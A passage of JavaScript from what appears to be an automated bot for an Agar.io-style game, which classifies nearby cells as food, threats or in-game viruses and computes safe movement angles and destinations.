= cell.color;          var cellRed = cellColor.substring(1,3);         var cellGreen = cellColor.substring(3,5);         var cellBlue = cellColor.substring(5,7);          var cellTeam = getTeam(cellRed, cellGreen, cellBlue);          if (currentTeam == cellTeam && !cell.isVirus()) {             return true;         }          //console.log(""COLOR: "" + color);      } else {         for (var i = 0; i < player.length; i++) {             if (cell.id == player[i].id) {                 return true;             }         }     }     return false; };  u.getTeam = function(red, green, blue) {     if (red == ""ff"") {         return 0;     } else if (green == ""ff"") {         return 1;     }     return 2; };  u.isFood = function(blob, cell) {     if (!cell.isVirus() && u.compareSize(cell, blob, 1.33) || (cell.size <= 11)) {         return true;     }     return false; } ; u.isThreat = function(blob, cell) {     if (!cell.isVirus() && u.isFood(cell, blob)) {         return true;     }     return false;     /*if (!cell.isVirus() && compareSize(blob, cell, 1.33)) {         return true;     }     return false;*/ };  u.isVirus = function(blob, cell) {     if (cell.isVirus() && u.compareSize(cell, blob, 1.30)) {         return true;     } else if (cell.isVirus() && cell.color.substring(3,5).toLowerCase() != ""ff"") {         return true;     }     return false; };  u.isSplitTarget = function(blob, cell) {     /*if (u.canSplit(cell, blob)) {         return true;     }*/     return false; };  u.getTimeToRemerge = function(mass){     return ((mass*0.02) + 30); };  u.separateListBasedOnFunction = function(listToUse, blob) {     var foodElementList = [];     var threatList = [];     var virusList = [];     var splitTargetList = [];      var player = u.getPlayer();      Object.keys(listToUse).forEach(function(element, index) {         var isMe = u.isItMe(player, listToUse[element]);          if (!isMe) {             if (u.isFood(blob, listToUse[element])/* && listToUse[element].isNotMoving()*/) {                 //IT\'S FOOD!                 foodElementList.push(listToUse[element]);                  if (u.isSplitTarget(blob, listToUse[element])) {                     u.drawCircle(listToUse[element].x, listToUse[element].y, listToUse[element].size + 50, 7);                     u.splitTargetList.push(listToUse[element]);                 }             } else if (u.isThreat(blob, listToUse[element])) {                 //IT\'S DANGER!                 threatList.push(listToUse[element]);             } else if (u.isVirus(blob, listToUse[element])) {                 //IT\'S VIRUS!                 virusList.push(listToUse[element]);             }         }/*else if(isMe && (getBlobCount(getPlayer()) > 0)){             //Attempt to make the other cell follow the mother one             foodElementList.push(listToUse[element]);         }*/     });      foodList = [];     for (var i = 0; i < foodElementList.length; i++) {         foodList.push([foodElementList[i].x, foodElementList[i].y, foodElementList[i].size]);     }      return [foodList, threatList, virusList, splitTargetList]; };  u.getAll = function(blob) {     var dotList = [];     var player = u.getPlayer();     var interNodes = u.getMemoryCells();      dotList = u.separateListBasedOnFunction(interNodes, blob);      return dotList; };  u.clusterFood = function(foodList, blobSize) {     var clusters = [];     var addedCluster = false;      //1: x     //2: y     //3: size or value     //4: Angle, not set here.      for (var i = 0; i < foodList.length; i++) {         for (var j = 0; j < clusters.length; j++) {             if (u.computeDistance(foodList[i][0], foodList[i][1], clusters[j][0], clusters[j][1]) < blobSize * 1.5) {                 clusters[j][0] = (foodList[i][0] + clusters[j][0]) / 2;                 clusters[j][1] = (foodList[i][1] + clusters[j][1]) / 2;                 clusters[j][2] += foodList[i][2];                 addedCluster = true;                 break;             }         }         if (!addedCluster) {             clusters.push([foodList[i][0], foodList[i][1], foodList[i][2], 0]);         }         addedCluster = false;     }     return clusters; };  u.getAngle = function(x1, y1, x2, y2) {     //Handle vertical and horizontal lines.      if (x1 == x2) {         if (y1 < y2) {             return 271;             //return 89;         } else {             return 89;         }     }      return (Math.round(Math.atan2(-(y1 - y2), -(x1 - x2)) / Math.PI * 180 + 180)); };  u.slope = function(x1, y1, x2, y2) {     var m = (y1 - y2) / (x1 - x2);      return m; };  u.slopeFromAngle = function(degree) {     if (degree == 270) {         degree = 271;     } else if (degree == 90) {         degree = 91;     }     return Math.tan((degree - 180) / 180 * Math.PI); };  //Given two points on a line, finds the slope of a perpendicular line crossing it. u.inverseSlope = function(x1, y1, x2, y2) {     var m = slope(x1, y1, x2, y2);     return (-1) / m; };  //Given a slope and an offset, returns two points on that line. u.pointsOnLine = function(slope, useX, useY, distance) {     var b = useY - slope * useX;     var r = Math.sqrt(1 + slope * slope);      var newX1 = (useX + (distance / r));     var newY1 = (useY + ((distance * slope) / r));     var newX2 = (useX + ((-distance) / r));     var newY2 = (useY + (((-distance) * slope) / r));      return [         [newX1, newY1],         [newX2, newY2]     ]; };  u.followAngle = function(angle, useX, useY, distance) {     var slope = u.slopeFromAngle(angle);     var coords = u.pointsOnLine(slope, useX, useY, distance);      var side = (angle - 90).mod(360);     if (side < 180) {         return coords[1];     } else {         return coords[0];     } };  //Using a line formed from point a to b, tells if point c is on S side of that line. u.isSideLine = function(a, b, c) {     if ((b[0] - a[0]) * (c[1] - a[1]) - (b[1] - a[1]) * (c[0] - a[0]) > 0) {         return true;     }     return false; };  //angle range2 is within angle range2 //an Angle is a point and a distance between an other point [5, 40] u.angleRangeIsWithin = function(range1, range2) {     if (range2[0] == (range2[0] + range2[1]).mod(360)) {         return true;     }     //console.log(""r1: "" + range1[0] + "", "" + range1[1] + "" ... r2: "" + range2[0] + "", "" + range2[1]);      var distanceFrom0 = (range1[0] - range2[0]).mod(360);     var distanceFrom1 = (range1[1] - range2[0]).mod(360);      if (distanceFrom0 < range2[1] && distanceFrom1 < range2[1] && distanceFrom0 < distanceFrom1) {         return true;     }     return false; };  u.angleRangeIsWithinInverted = function(range1, range2) {     var distanceFrom0 = (range1[0] - range2[0]).mod(360);     var distanceFrom1 = (range1[1] - range2[0]).mod(360);      if (distanceFrom0 < range2[1] && distanceFrom1 < range2[1] && distanceFrom0 > distanceFrom1) {         return true;     }     return false; };  u.angleIsWithin = function(angle, range) {     var diff = (u.rangeToAngle(range) - angle).mod(360);     if (diff >= 0 && diff <= range[1]) {         return true;     }     return false; };  u.rangeToAngle = function(range) {     return (range[0] + range[1]).mod(360); };  u.anglePair = function(range) {     return (range[0] + "", "" + u.rangeToAngle(range) + "" range: "" + range[1]); };  u.computeAngleRanges = function(blob1, blob2) {     var mainAngle = u.getAngle(blob1.x, blob1.y, blob2.x, blob2.y);     var leftAngle = (mainAngle - 90).mod(360);     var rightAngle = (mainAngle + 90).mod(360);      var blob1Left = u.followAngle(leftAngle, blob1.x, blob1.y, blob1.size);     var blob1Right = u.followAngle(rightAngle, blob1.x, blob1.y, blob1.size);      var blob2Left = u.followAngle(rightAngle, blob2.x, blob2.y, blob2.size);     var blob2Right = u.followAngle(leftAngle, blob2.x, blob2.y, blob2.size);      var blob1AngleLeft = u.getAngle(blob2.x, blob2.y, blob1Left[0], blob1Left[1]);     var blob1AngleRight = u.getAngle(blob2.x, blob2.y, blob1Right[0], blob1Right[1]);      var blob2AngleLeft = u.getAngle(blob1.x, blob1.y, blob2Left[0], blob2Left[1]);     var blob2AngleRight = u.getAngle(blob1.x, blob1.y, blob2Right[0], blob2Right[1]);      var blob1Range = (blob1AngleRight - blob1AngleLeft).mod(360);     var blob2Range = (blob2AngleRight - blob2AngleLeft).mod(360);      var tempLine = u.followAngle(blob2AngleLeft, blob2Left[0], blob2Left[1], 400);     //drawLine(blob2Left[0], blob2Left[1], tempLine[0], tempLine[1], 0);      if ((blob1Range / blob2Range) > 1) {         drawPoint(blob1Left[0], blob1Left[1], 3, """");         drawPoint(blob1Right[0], blob1Right[1], 3, """");         drawPoint(blob1.x, blob1.y, 3, """" + blob1Range + "", "" + blob2Range + "" R: "" + (Math.round((blob1Range / blob2Range) * 1000) / 1000));     }      //drawPoint(blob2.x, blob2.y, 3, """" + blob1Range); };  u.debugAngle = function(angle, text) {     var player = u.getPlayer();     var line1 = u.followAngle(angle, player[0].x, player[0].y, 300);     u.drawLine(player[0].x, player[0].y, line1[0], line1[1], 5);     u.drawPoint(line1[0], line1[1], 5, """" + text); };  //TODO: Don\'t let this function do the radius math. u.getEdgeLinesFromPoint = function(blob1, blob2, radius) {     var px = blob1.x;     var py = blob1.y;      var cx = blob2.x;     var cy = blob2.y;      //var radius = blob2.size;      /*if (blob2.isVirus()) {         radius = blob1.size;     } else if(canSplit(blob1, blob2)) {         radius += splitDistance;     } else {         radius += blob1.size * 2;     }*/      var shouldInvert = false;      var tempRadius = u.computeDistance(px, py, cx, cy);     if (tempRadius <= radius) {         radius = tempRadius - 5;         shouldInvert = true;     }      var dx = cx - px;     var dy = cy - py;     var dd = Math.sqrt(dx * dx + dy * dy);     var a = Math.asin(radius / dd);     var b = Math.atan2(dy, dx);      var t = b - a;     var ta = {         x: radius * Math.sin(t),         y: radius * -Math.cos(t)     };      t = b + a;     var tb = {         x: radius * -Math.sin(t),         y: radius * Math.cos(t)     };      var angleLeft = u.getAngle(cx + ta.x, cy + ta.y, px, py);     var angleRight = u.getAngle(cx + tb.x, cy + tb.y, px, py);     var angleDistance = (angleRight - angleLeft).mod(360);      /*if (shouldInvert) {         var temp = angleLeft;         angleLeft = (angleRight + 180).mod(360);         angleRight = (temp + 180).mod(360);         angleDistance = (angleRight - angleLeft).mod(360);     }*/      return [angleLeft, angleDistance, [cx + tb.x, cy + tb.y],         [cx + ta.x, cy + ta.y]     ]; };  u.invertAngle = function(range) {     var angle1 = u.rangeToAngle(badAngles[i]);     var angle2 = (badAngles[i][0] - angle1).mod(360);     return [angle1, angle2]; };  u.addWall = function(listToUse, blob) {     //var mapSizeX = Math.abs(f.getMapStartX - f.getMapEndX);     //var mapSizeY = Math.abs(f.getMapStartY - f.getMapEndY);     //var distanceFromWallX = mapSizeX/3;     //var distanceFromWallY = mapSizeY/3;     var distanceFromWallY = 2000;     var distanceFromWallX = 2000;     if (blob.x < f.getMapStartX() + distanceFromWallX) {         //LEFT         //console.log(""Left"");         listToUse.push([             [90, true],             [270, false], u.computeDistance(getMapStartX(), blob.y, blob.x, blob.y)         ]);         var lineLeft = u.followAngle(90, blob.x, blob.y, 190 + blob.size);         var lineRight = u.followAngle(270, blob.x, blob.y, 190 + blob.size);         u.drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);         u.drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);     }     if (blob.y < getMapStartY() + distanceFromWallY) {         //TOP         //console.log(""TOP"");         listToUse.push([             [180, true],             [0, false], u.computeDistance(blob.x, getMapStartY, blob.x, blob.y)         ]);         var lineLeft = u.followAngle(180, blob.x, blob.y, 190 + blob.size);         var lineRight = u.followAngle(360, blob.x, blob.y, 190 + blob.size);         u.drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);         u.drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);     }     if (blob.x > getMapEndX() - distanceFromWallX) {         //RIGHT         //console.log(""RIGHT"");         listToUse.push([             [270, true],             [90, false], u.computeDistance(getMapEndX(), blob.y, blob.x, blob.y)         ]);         var lineLeft = u.followAngle(270, blob.x, blob.y, 190 + blob.size);         var lineRight = u.followAngle(90, blob.x, blob.y, 190 + blob.size);         u.drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);         u.drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);     }     if (blob.y > getMapEndY() - distanceFromWallY) {         //BOTTOM         //console.log(""BOTTOM"");         listToUse.push([             [0, true],             [180, false], u.computeDistance(blob.x, getMapEndY(), blob.x, blob.y)         ]);         var lineLeft = u.followAngle(0, blob.x, blob.y, 190 + blob.size);         var lineRight = u.followAngle(180, blob.x, blob.y, 190 + blob.size);         u.drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);         u.drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);     }     return listToUse; };  //listToUse contains angles in the form of [angle, boolean]. //boolean is true when the range is starting. False when it\'s ending. //range = [[angle1, true], [angle2, false]]  u.getAngleIndex = function(listToUse, angle) {     if (listToUse.length == 0) {         return 0;     }      for (var i = 0; i < listToUse.length; i++) {         if (angle <= listToUse[i][0]) {             return i;         }     }      return listToUse.length; };  u.addAngle = function(listToUse, range) {     //#1 Find first open element     //#2 Try to add range1 to the list. If it is within other range, don\'t add it, set a boolean.     //#3 Try to add range2 to the list. If it is withing other range, don\'t add it, set a boolean.      //TODO: Only add the new range at the end after the right stuff has been removed.      var newListToUse = listToUse.slice();      var startIndex = 1;      if (newListToUse.length > 0 && !newListToUse[0][1]) {         startIndex = 0;     }      var startMark = u.getAngleIndex(newListToUse, range[0][0]);     var startBool = startMark.mod(2) != startIndex;      var endMark = u.getAngleIndex(newListToUse, range[1][0]);     var endBool = endMark.mod(2) != startIndex;      var removeList = [];      if (startMark != endMark) {         //Note: If there is still an error, this would be it.         var biggerList = 0;         if (endMark == newListToUse.length) {             biggerList = 1;         }          for (var i = startMark; i < startMark + (endMark - startMark).mod(newListToUse.length + biggerList); i++) {             removeList.push((i).mod(newListToUse.length));         }     } else if (startMark < newListToUse.length && endMark < newListToUse.length) {         var startDist = (newListToUse[startMark][0] - range[0][0]).mod(360);         var endDist = (newListToUse[endMark][0] - range[1][0]).mod(360);          if (startDist < endDist) {             for (var i = 0; i < newListToUse.length; i++) {                 removeList.push(i);             }         }     }      removeList.sort(function(a, b){return b-a;});      for (var i = 0; i < removeList.length; i++) {         newListToUse.splice(removeList[i], 1);     }      if (startBool) {         newListToUse.splice(u.getAngleIndex(newListToUse, range[0][0]), 0, range[0]);     }     if (endBool) {         newListToUse.splice(u.getAngleIndex(newListToUse, range[1][0]), 0, range[1]);     }      return newListToUse; };  u.getAngleRange = function(blob1, blob2, index, radius) {     var angleStuff = u.getEdgeLinesFromPoint(blob1, blob2, radius);      var leftAngle = angleStuff[0];     var rightAngle = u.rangeToAngle(angleStuff);     var difference = angleStuff[1];      u.drawPoint(angleStuff[2][0], angleStuff[2][1], 3, """");     u.drawPoint(angleStuff[3][0], angleStuff[3][1], 3, """");      //console.log(""Adding badAngles: "" + leftAngle + "", "" + rightAngle + "" diff: "" + difference);      var lineLeft = u.followAngle(leftAngle, blob1.x, blob1.y, 150 + blob1.size - index * 10);     var lineRight = u.followAngle(rightAngle, blob1.x, blob1.y, 150 + blob1.size - index * 10);      if (blob2.isVirus()) {         u.drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 6);         u.drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 6);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 6);     } else if(getCells().hasOwnProperty(blob2.id)) {         u.drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 0);         u.drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 0);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 0);     } else {         u.drawLine(blob1.x, blob1.y, lineLeft[0], lineLeft[1], 3);         u.drawLine(blob1.x, blob1.y, lineRight[0], lineRight[1], 3);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob1.x, blob1.y, 3);     }      return [leftAngle, difference]; };  //Given a list of conditions, shift the angle to the closest available spot respecting the range given. u.shiftAngle = function(listToUse, angle, range) {     //TODO: shiftAngle needs to respect the range! DONE?     for (var i = 0; i < listToUse.length; i++) {         if (u.angleIsWithin(angle, listToUse[i])) {             //console.log(""Shifting needed!"");              var angle1 = listToUse[i][0];             var angle2 = u.rangeToAngle(listToUse[i]);              var dist1 = (angle - angle1).mod(360);             var dist2 = (angle2 - angle).mod(360);              if (dist1 < dist2) {                 if (u.angleIsWithin(angle1, range)) {                     return angle1;                 } else {                     return angle2;                 }             } else {                 if (u.angleIsWithin(angle2, range)) {                     return angle2;                 } else {                     return angle1;                 }             }         }     }     //console.log(""No Shifting Was needed!"");     return angle; };  /**  * This is the main bot logic. This is called quite often.  * @param  followMouse Is a boolean. If set to true, it means the user is asking for the bot to follow the mouse coordinates.  * @return A 2 dimensional array with coordinates for every cells.  [[x, y], [x, y]]  */ u.findDestination = function(followMouse) {     var player = getPlayer();     var interNodes = getMemoryCells();     //console.warn(""findDestination(followMouse) was called from line "" + arguments.callee.caller.toString());      if ( /*!toggle*/ 1) {          //The following code converts the mouse position into an         //absolute game coordinate.         var useMouseX = u.screenToGameX(getMouseX());         var useMouseY = u.screenToGameY(getMouseY());         tempPoint = [useMouseX, useMouseY, 1];          //The current destination that the cells were going towards.         var tempMoveX = getPointX();         var tempMoveY = getPointY();          //This variable will be returned at the end.         //It will contain the destination choices for all the cells.         //BTW!!! ERROR ERROR ABORT MISSION!!!!!!! READ BELOW -----------         //         //SINCE IT\'S STUPID NOW TO ASK EACH CELL WHERE THEY WANT TO GO,         //THE BOT SHOULD SIMPLY PICK ONE AND THAT\'S IT, I MEAN WTF....         var destinationChoices = []; //destination, size, danger          //Just to make sure the player is alive.         if (player.length > 0) {              //Loop through all the player\'s cells.             for (var k = 0; k < player.length; k++) {                 if (true) {                     u.drawPoint(player[k].x, player[k].y + player[k].size, 0, """" + (getLastUpdate() - player[k].birth) + "" / "" + (30000 + (player[k].birthMass * 57) - (getLastUpdate() - player[k].birth)) + "" / "" + player[k].birthMass);                 }             }               //Loops only for one cell for now.             for (var k = 0; /*k < player.length*/ k < 1; k++) {                  //console.log(""Working on blob: "" + k);                  u.drawCircle(player[k].x, player[k].y, player[k].size + u.splitDistance, 5);                 //drawPoint(player[0].x, player[0].y - player[0].size, 3, """" + Math.floor(player[0].x) + "", "" + Math.floor(player[0].y));                  //var allDots = processEverything(interNodes);                  //loop through everything that is on the screen and                 //separate everything in it\'s own category.                 var allIsAll = u.getAll(player[k]);                  //The food stored in element 0 of allIsAll                 var allPossibleFood = allIsAll[0];                 //The threats are stored in element 1 of allIsAll                 var allPossibleThreats = allIsAll[1];                 //The viruses are stored in element 2 of allIsAll                 var allPossibleViruses = allIsAll[2];                  //The bot works by removing angles in which it is too                 //dangerous to travel towards to.                 var badAngles = [];                 var obstacleList = [];                  var isSafeSpot = true;                 var isMouseSafe = true;                  var clusterAllFood = u.clusterFood(allPossibleFood, player[k].size);                  //console.log(""Looking for enemies!"");                  //Loop through all the cells that were identified as threats.                 for (var i = 0; i < allPossibleThreats.length; i++) {                      var enemyDistance = u.computeDistanceFromCircleEdge(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y, allPossibleThreats[i].size);                      allPossibleThreats[i].enemyDist = enemyDistance;                 }                  /*allPossibleThreats.sort(function(a, b){                     return a.enemyDist-b.enemyDist;                 })*/                  for (var i = 0; i < allPossibleThreats.length; i++) {                      var enemyDistance = u.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y);                      var splitDangerDistance = allPossibleThreats[i].size + u.splitDistance + 150;                      var normalDangerDistance = allPossibleThreats[i].size + 150;                      var shiftDistance = player[k].size;                      //console.log(""Found distance."");                      var enemyCanSplit = u.canSplit(player[k], allPossibleThreats[i]);                                          for (var j = clusterAllFood.length - 1; j >= 0 ; j--) {                         var secureDistance = (enemyCanSplit ? splitDangerDistance : normalDangerDistance);                         if (u.computeDistance(allPossibleThreats[i].x, allPossibleThreats[i].y, clusterAllFood[j][0], clusterAllFood[j][1]) < secureDistance)                             clusterAllFood.splice(j, 1);                     }                      //console.log(""Removed some food."");                      if (enemyCanSplit) {                         u.drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, splitDangerDistance, 0);                         u.drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, splitDangerDistance + shiftDistance, 6);                     } else {                         u.drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, normalDangerDistance, 3);                         u.drawCircle(allPossibleThreats[i].x, allPossibleThreats[i].y, normalDangerDistance + shiftDistance, 6);                     }                      if (allPossibleThreats[i].danger && getLastUpdate() - allPossibleThreats[i].dangerTimeOut > 1000) {                          allPossibleThreats[i].danger = false;                     }                      /*if ((enemyCanSplit && enemyDistance < splitDangerDistance) ||                         (!enemyCanSplit && enemyDistance < normalDangerDistance)) {                         allPossibleThreats[i].danger = true;                         allPossibleThreats[i].dangerTimeOut = f.getLastUpdate();                     }*/                      //console.log(""Figured out who was important."");                      if ((enemyCanSplit && enemyDistance < splitDangerDistance) || (enemyCanSplit && allPossibleThreats[i].danger)) {                          badAngles.push(u.getAngleRange(player[k], allPossibleThreats[i], i, splitDangerDistance).concat(allPossibleThreats[i].enemyDist));                      } else if ((!enemyCanSplit && enemyDistance < normalDangerDistance) || (!enemyCanSplit && allPossibleThreats[i].danger)) {                          badAngles.push(u.getAngleRange(player[k], allPossibleThreats[i], i, normalDangerDistance).concat(allPossibleThreats[i].enemyDist));                      } else if (enemyCanSplit && enemyDistance < splitDangerDistance + shiftDistance) {                         var tempOb = u.getAngleRange(player[k], allPossibleThreats[i], i, splitDangerDistance + shiftDistance);                         var angle1 = tempOb[0];                         var angle2 = u.rangeToAngle(tempOb);                          obstacleList.push([[angle1, true], [angle2, false]]);                     } else if (!enemyCanSplit && enemyDistance < normalDangerDistance + shiftDistance) {                         var tempOb = u.getAngleRange(player[k], allPossibleThreats[i], i, normalDangerDistance + shiftDistance);                         var angle1 = tempOb[0];                         var angle2 = u.rangeToAngle(tempOb);                          obstacleList.push([[angle1, true], [angle2, false]]);                     }                     //console.log(""Done with enemy: "" + i);                 }                  //console.log(""Done looking for enemies!"");                  var goodAngles = [];                 var stupidList = [];                  for (var i = 0; i < allPossibleViruses.length; i++) {                     if (player[k].size < allPossibleViruses[i].size) {                         u.drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, allPossibleViruses[i].size + 10, 3);                         u.drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, allPossibleViruses[i].size * 2, 6);                      } else {                         u.drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].size + 50, 3);                         u.drawCircle(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].size * 2, 6);                     }                 }                  for (var i = 0; i < allPossibleViruses.length; i++) {                     var virusDistance = u.computeDistance(allPossibleViruses[i].x, allPossibleViruses[i].y, player[k].x, player[k].y);                     if (player[k].size < allPossibleViruses[i].size) {                         if (virusDistance < (allPossibleViruses[i].size * 2)) {                             var tempOb = u.getAngleRange(player[k], allPossibleViruses[i], i, allPossibleViruses[i].size + 10);                             var angle1 = tempOb[0];                             var angle2 = u.rangeToAngle(tempOb);                             obstacleList.push([[angle1, true], [angle2, false]]);                         }                     } else {                         if (virusDistance < (player[k].size * 2)) {                             var tempOb = u.getAngleRange(player[k], allPossibleViruses[i], i, player[k].size + 50);                             var angle1 = tempOb[0];                             var angle2 = u.rangeToAngle(tempOb);                             obstacleList.push([[angle1, true], [angle2, false]]);                         }                     }                 }                  if (badAngles.length > 0) {                     //NOTE: This is only bandaid wall code. It\'s not the best way to do it.                     stupidList = u.addWall(stupidList, player[k]);                 }                  for (var i = 0; i < badAngles.length; i++) {                     var angle1 = badAngles[i][0];                     var angle2 = u.rangeToAngle(badAngles[i]);                     stupidList.push([[angle1, true], [angle2, false], badAngles[i][2]]);                 }                  //stupidList.push([[45, true], [135, false]]);                 //stupidList.push([[10, true], [200, false]]);                  stupidList.sort(function(a, b){                     //console.log(""Distance: "" + a[2] + "", "" + b[2]);                     return a[2]-b[2];                 });                  //console.log(""Added random noob stuff."");                  var sortedInterList = [];                 var sortedObList = [];                  for (var i = 0; i < stupidList.length; i++) {                     //console.log(""Adding to sorted: "" + stupidList[i][0][0] + "", "" + stupidList[i][1][0]);                     var tempList = u.addAngle(sortedInterList, stupidList[i]);                      if (tempList.length == 0) {                         console.log(""MAYDAY IT\'S HAPPENING!"");                         break;                     } else {                         sortedInterList = tempList;                     }                 }                  for (var i = 0; i < obstacleList.length; i++) {                     sortedObList = u.addAngle(sortedObList, obstacleList[i]);                      if (sortedObList.length == 0) {                         break;                     }                 }                  var offsetI = 0;                 var obOffsetI = 1;                  if (sortedInterList.length > 0 && sortedInterList[0][1]) {                     offsetI = 1;                 }                 if (sortedObList.length > 0 && sortedObList[0][1]) {                     obOffsetI = 0;                 }                  var goodAngles = [];                 var obstacleAngles = [];                  for (var i = 0; i < sortedInterList.length; i += 2) {                     var angle1 = sortedInterList[(i + offsetI).mod(sortedInterList.length)][0];                     var angle2 = sortedInterList[(i + 1 + offsetI).mod(sortedInterList.length)][0];                     var diff = (angle2 - angle1).mod(360);                     goodAngles.push([angle1, diff]);                 }                  for (var i = 0; i < sortedObList.length; i += 2) {                     var angle1 = sortedObList[(i + obOffsetI).mod(sortedObList.length)][0];                     var angle2 = sortedObList[(i + 1 + obOffsetI).mod(sortedObList.length)][0];                     var diff = (angle2 - angle1).mod(360);                     obstacleAngles.push([angle1, diff]);                 }                  for (var i = 0; i < goodAngles.length; i++) {                     var line1 = u.followAngle(goodAngles[i][0], player[k].x, player[k].y, 100 + player[k].size);                     var line2 = u.followAngle((goodAngles[i][0] + goodAngles[i][1]).mod(360), player[k].x, player[k].y, 100 + player[k].size);                     u.drawLine(player[k].x, player[k].y, line1[0], line1[1], 1);                     u.drawLine(player[k].x, player[k].y, line2[0], line2[1], 1);                      u.drawArc(line1[0], line1[1], line2[0], line2[1], player[k].x, player[k].y, 1);                      //drawPoint(player[0].x, player[0].y, 2, """");                      u.drawPoint(line1[0], line1[1], 0, """" + i + "": 0"");                     u.drawPoint(line2[0], line2[1], 0, """" + i + "": 1"");                 }                  for (var i = 0; i < obstacleAngles.length; i++) {                     var line1 = u.followAngle(obstacleAngles[i][0], player[k].x, player[k].y, 50 + player[k].size);                     var line2 = u.followAngle((obstacleAngles[i][0] + obstacleAngles[i][1]).mod(360), player[k].x, player[k].y, 50 + player[k].size);                     u.drawLine(player[k].x, player[k].y, line1[0], line1[1], 6);                     u.drawLine(player[k].x, player[k].y, line2[0], line2[1], 6);                      u.drawArc(line1[0], line1[1], line2[0], line2[1], player[k].x, player[k].y, 6);                      //drawPoint(player[0].x, player[0].y, 2, """");                      u.drawPoint(line1[0], line1[1], 0, """" + i + "": 0"");                     u.drawPoint(line2[0], line2[1], 0, """" + i + "": 1"");                 }                  if (followMouse && goodAngles.length == 0) {                     //This is the follow the mouse mode                     var distance = u.computeDistance(player[k].x, player[k].y, tempPoint[0], tempPoint[1]);                      var shiftedAngle = u.shiftAngle(obstacleAngles, u.getAngle(tempPoint[0], tempPoint[1], player[k].x, player[k].y), [0, 360]);                      var destination = u.followAngle(shiftedAngle, player[k].x, player[k].y, distance);                      destinationChoices = destination;                     u.drawLine(player[k].x, player[k].y, destination[0], destination[1], 1);                     //tempMoveX = destination[0];                     //tempMoveY = destination[1];                  } else if (goodAngles.length > 0) {                     var bIndex = goodAngles[0];                     var biggest = goodAngles[0][1];                     for (var i = 1; i < goodAngles.length; i++) {                         var size = goodAngles[i][1];                         if (size > biggest) {                             biggest = size;                             bIndex = goodAngles[i];                         }                     }                     var perfectAngle = (bIndex[0] + bIndex[1] / 2).mod(360);                      perfectAngle = u.shiftAngle(obstacleAngles, perfectAngle, bIndex);                      var line1 = u.followAngle(perfectAngle, player[k].x, player[k].y, verticalDistance());                      destinationChoices = line1;                     u.drawLine(player[k].x, player[k].y, line1[0], line1[1], 7);                     //tempMoveX = line1[0];                     //tempMoveY = line1[1];                 } else if (badAngles.length > 0 && goodAngles == 0) {                     //When there are enemies around but no good angles                     //You\'re likely screwed. (This should never happen.)                      console.log(""Failed"");                     destinationChoices = [tempMoveX, tempMoveY];                     /*var angleWeights = [] //Put weights on the angles according to enemy distance                     for (var i = 0; i < allPossibleThreats.length; i++){                         var dist = computeDistance(player[k].x, player[k].y, allPossibleThreats[i].x, allPossibleThreats[i].y);                         var angle = getAngle(allPossibleThreats[i].x, allPossibleThreats[i].y, player[k].x, player[k].y);                         angleWeights.push([angle,dist]);                     }                     var maxDist = 0;                     var finalAngle = 0;                     for (var i = 0; i < angleWeights.length; i++){                         if (angleWeights[i][1] > maxDist){                             maxDist = angleWeights[i][1];                             finalAngle = (angleWeights[i][0] + 180).mod(360);                         }                     }                     var line1 = followAngle(finalAngle,player[k].x,player[k].y,f.verticalDistance());                     drawLine(player[k].x, player[k].y, line1[0], line1[1], 2);                     destinationChoices.push(line1);*/                 } else if (clusterAllFood.length > 0) {                     for (var i = 0; i < clusterAllFood.length; i++) {                         //console.log(""mefore: "" + clusterAllFood[i][2]);                         //This is the cost function. Higher is better.                              var clusterAngle = u.getAngle(clusterAllFood[i][0], clusterAllFood[i][1], player[k].x, player[k].y);                              clusterAllFood[i][2] = clusterAllFood[i][2] * 6 - u.computeDistance(clusterAllFood[i][0], clusterAllFood[i][1], player[k].x, player[k].y);                             //console.log(""Current Value: "" + clusterAllFood[i][2]);                              //(goodAngles[bIndex][1] / 2 - (Math.abs(perfectAngle - clusterAngle)));                              clusterAllFood[i][3] = clusterAngle;                              u.drawPoint(clusterAllFood[i][0], clusterAllFood[i][1], 1, """");                             //console.log(""After: "" + clusterAllFood[i][2]);                     }                      var bestFoodI = 0;                     var bestFood = clusterAllFood[0][2];                     for (var i = 1; i < clusterAllFood.length; i++) {                         if (bestFood < clusterAllFood[i][2]) {                             bestFood = clusterAllFood[i][2];                             bestFoodI = i;                         }                     }                      //console.log(""Best Value: "" + clusterAllFood[bestFoodI][2]);                      var distance = u.computeDistance(player[k].x, player[k].y, clusterAllFood[bestFoodI][0], clusterAllFood[bestFoodI][1]);                      var shiftedAngle = u.shiftAngle(obstacleAngles, u.getAngle(clusterAllFood[bestFoodI][0], clusterAllFood[bestFoodI][1], player[k].x, player[k].y), [0, 360]);                      var destination = u.followAngle(shiftedAngle, player[k].x, player[k].y, distance);                      destinationChoices = destination;                     //tempMoveX = destination[0];                     //tempMoveY = 